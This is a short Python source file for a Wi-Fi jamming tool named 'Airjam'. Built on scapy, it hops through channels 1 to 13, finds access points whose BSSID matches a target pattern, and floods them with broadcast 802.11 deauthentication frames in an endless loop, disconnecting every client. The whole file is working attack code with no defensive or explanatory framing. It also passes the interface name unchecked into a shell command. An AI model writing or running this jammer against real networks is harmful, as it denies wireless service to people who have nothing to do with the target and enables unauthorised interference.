#!/usr/bin/env python
# -*- coding: utf-8 -*-

import argparse, time, os, sys, signal, re
from scapy.all import *
from multiprocessing import Process, Manager

class Airjam():

    def __init__(self, interface, target):
        self.interface = interface
        self.target    = target

        self.manager = Manager()

        self.flags = self.manager.dict()

    def deauth(self, pkt):
        if (pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp)):
            if bool(re.search(self.target, pkt[Dot11].addr3)):
                essid = pkt[Dot11Elt].info
                bssid = pkt[Dot11].addr3 
                channel = int(ord(pkt[Dot11Elt:3].info))
                client  = 'ff:ff:ff:ff:ff:ff'

                print "%s ( %s ) on channel %d" % (essid, bssid, channel)

                os.system("iw dev %s set channel %d" % (self.interface, channel))

                sendp(RadioTap()/Dot11(type=0, subtype=12, addr1=client, addr2=bssid, addr3=pkt.addr3)/Dot11Deauth(), count=6, iface=self.interface, verbose=0)

    def keep(self, pkt):
        return self.flags['stop_sniff']

    def hopper(self):
        for channel in range(1,14):
            print "set up channel: %d" % channel
            os.system("iw dev %s set channel %d" % (self.interface, channel))
            time.sleep(0.7)
        self.flags['stop_sniff'] = True

    def run(self):
        while True:
            self.flags['stop_sniff'] = False
            p = Process(target = self.hopper)
            p.start()
            sniff(iface=self.interface, prn=self.deauth, stop_filter=self.keep)
            p.terminate()
            p.join()

